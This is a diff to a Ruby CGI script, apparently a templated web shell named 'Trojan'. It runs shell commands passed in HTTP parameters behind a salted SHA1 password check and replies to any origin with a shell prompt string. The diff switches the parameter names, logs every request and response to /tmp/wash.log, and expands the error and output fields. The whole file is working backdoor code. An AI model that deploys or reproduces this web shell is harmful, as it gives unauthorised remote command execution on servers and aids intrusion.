@@ -1,21 +1,32 @@
 #!/usr/bin/env ruby
+
+
+
+
+require 'logger'
 require 'cgi'
 require 'digest/sha1'
 require 'json'
+
+$logger = Logger.new('/tmp/wash.log')
 
 class Trojan
     attr_accessor :cgi, :cwd, :response
 
     def initialize params
         @cgi      = params[:cgi]
-        @cwd      = (params['cwd'].nil?) ? `pwd`.strip! : params['cwd']
-        @response = {};
+        @cwd      = (params['args[cwd]'].nil?) ? `pwd`.strip! : params['args[cwd]']
+        @response = {
+            'error'  => '',
+            'output' => {},
+        };
     end
 
     def process_command()
         json = @cgi.params
+        $logger.debug json
         if json['action'].first.eql? 'shell'
-            process_shell_command(json['args']['cmd'].first)
+            process_shell_command(json['args[cmd]'].first)
         else
             send json['action'].first, json
         end
@@ -30,15 +41,19 @@ class Trojan
 
     def send_response
         @response['output']['prompt'] = self.get_prompt_context
+        $logger.debug(@response.to_json)
+        $logger.debug "\n\n"
+
         puts @cgi.header('Access-Control-Allow-Origin: *')
         puts @response.to_json
+        puts
         exit
     end
 
     def get_prompt_context
-        whoami          =  `whoami`.strip!
-        hostname        =  `hostname`.strip!
-        line_terminator =  (whoami == 'root') ? '#' : '$';
+        whoami          = `whoami`.strip!
+        hostname        = `hostname`.strip!
+        line_terminator = (whoami == 'root') ? '#' : '$';
         return "#{whoami}@#{hostname}:#{@cwd}#{line_terminator}";
     end
 
@@ -49,7 +64,6 @@ class Trojan
 end
 
 # ---------- Procedural code starts here ----------
-
 cgi  = CGI.new
 
 hash = Digest::SHA1.hexdigest(cgi.params['args[password]'].first + '<%= params[:salt] %>')
@@ -59,4 +73,5 @@ if hash.eql? '<%= params[:hash] %>'
 else
     puts cgi.header('Access-Control-Allow-Origin: *')
     puts '{"error":"Invalid password."}'
+    puts
 end
